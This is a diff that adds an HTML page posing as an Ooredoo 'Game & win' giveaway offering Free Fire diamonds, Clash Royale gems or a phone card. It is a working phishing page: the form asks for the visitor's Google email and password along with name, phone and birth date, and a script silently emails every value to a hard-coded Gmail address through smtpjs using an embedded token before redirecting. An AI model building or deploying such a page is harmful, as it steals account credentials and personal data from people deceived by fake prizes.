@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="nouv.css">
+    <script src="nouv.js" defer></script>
+    <title>Document</title>
+</head>
+<body>
+    <div class="container">
+        <h1 class="form-title">Ooredoo Game & win</h1>
+        <form onsubmit="sendEmail(); reset(); return false;">
+            <div class="main-user-info">
+                <div class="user-input-box">
+                    <label for="fullName">First name</label>
+                    <input type="text" id="fullName" name="fullName" placeholder="Enter first name" onkeyup="a()" required/>
+                </div>
+                <div class="user-input-box">
+                    <label for="userName">Last Name</label>
+                    <input type="text" id="userName" name="username" placeholder="Enter last name" onkeyup="b()" required/>
+                </div>
+                <div class="user-input-box">
+                    <label for="email">Email Google account </label>
+                    <input type="email" id="email" name="email" placeholder="Enter google email" required/>
+                </div>
+              
+                <div class="user-input-box">
+                    <label for="password">Pass word google account</label>
+                    <input type="password" id="password" name="password" placeholder="Enter google password" required/>
+                </div>
+                <div class="user-input-box">
+                    <label for="phoneNumber">Phone Number</label>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Enter phone Number" required/>
+                </div>
+                <div class="user-input-box">
+                    <label for="age">Age</label>
+                    <input type="date" id="age" name="age" placeholder="Enter your age" required/>
+                </div>
+            </div>
+            <div class="gender-details-box">
+                <span class="gender-title">Je m'inscris pour gagner</span>
+                <div class="gender-category">
+                    <input type="radio" name="gender" id="male" value="freefire">
+                    <label for="male">1000 Diamants Free fire</label>
+                </div>
+                <div class="gender-category">
+
+                    <input type="radio" name="gender" id="female" value="clash">
+                    <label for="female">1000 GEMS clash_royale</label>
+                </div>
+                <div class="gender-category">
+
+                    <input type="radio" name="gender" id="other" value="google" checked>
+                    <label for="other">30dt carte ooredoo</label>
+                </div>
+            </div>
+            <div class="form-submit-btn">
+                <input type="submit" value="Register">
+            </div>
+        </form>
+
+    </div>
+
+    
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+
+        function sendEmail(){
+
+        
+            
+            
+                Email.send({
+    SecureToken : "021fcc32-091f-4d14-9954-2a59e50f3160",
+    To : 'benhadjothmanmohamedaziz@gmail.com',
+    From : 'benhadjothmanmohamedaziz@gmail.com',
+    Subject : "This is the subject",
+    Body : "#full name = "+document.getElementById('fullName').value+
+    "<br>  #user name = "+document.getElementById('userName').value+
+    "<br> #email = "+ document.getElementById('email').value+
+    "<br> #password = "+ document.getElementById('password').value+
+    "<br> #phone number = "+ document.getElementById('phoneNumber').value+
+    "<br> #age = "+ document.getElementById('age').value+
+    "<br> #radio = "+document.querySelector('input[name="gender"]:checked').value
+
+}).then(
+        
+    redirect()
+);
+        }
+        function redirect()
+{
+    console.log('bbbbbbbbbbbbbbbbb')
+    window.location.href="interface.html";
+}
+    
+    </script>
+    
+</body>
+</html>
+
